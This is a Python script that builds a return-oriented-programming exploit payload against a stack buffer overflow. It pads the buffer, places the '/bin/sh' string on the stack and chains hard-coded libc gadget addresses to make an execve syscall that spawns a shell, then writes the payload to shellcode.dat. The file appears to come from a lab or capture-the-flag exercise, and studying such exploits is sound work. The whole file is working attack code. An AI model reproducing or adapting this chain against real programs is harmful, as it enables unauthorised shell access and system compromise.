#!/usr/bin/python

import struct

import binascii

#max 0x195000 of offset
LIBC_OFFSET = 0x7ffff7a3a000
g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
d1 = 59
g2 = LIBC_OFFSET + 0xf54f9 #pop rdx ; pop rsi ; ret
d2 = 0x00
g3 = LIBC_OFFSET + 0x1fc6a  # pop rdi ; ret
d4 = 0x7fffffffe154 #address of /bin/sh on the stack
retStringRev = 0x0068732f6e69622f
g4 = 0x7ffff7b9476b #syscall
shellcode = ''
shellcode += 'A'*(36)
shellcode += struct.pack('<q', retStringRev)
shellcode += 'A'*(1004)
shellcode += struct.pack('<q', g1)#pop rax ; ret
shellcode += struct.pack('<q', d1) #59
shellcode += struct.pack('<q', g2)#pop rdx + rsi
shellcode += struct.pack('<q', d2) #0
shellcode += struct.pack('<q', d2)# 0
shellcode += struct.pack('<q', g3)# pop rdi
shellcode += struct.pack('<q', d4) #address to /bin/sh string
shellcode += struct.pack('<q', g4) #syscall

print ("shellcode: "+ shellcode)
with open("shellcode.dat", "wb") as f:
    f.write(shellcode)
print (binascii.hexlify(shellcode))
print ("g1: %x" % (g1))
print ("d1: %x" % (d1))
print ("g2: %x" % (g2))
print ("d2: %x" % (d2))
print ("g4: %x" % (g3))
print ("d6: %x" % (d4))
print ("g5: %x" % (g4))
print ("ret in buffer: %x" % (retStringRev))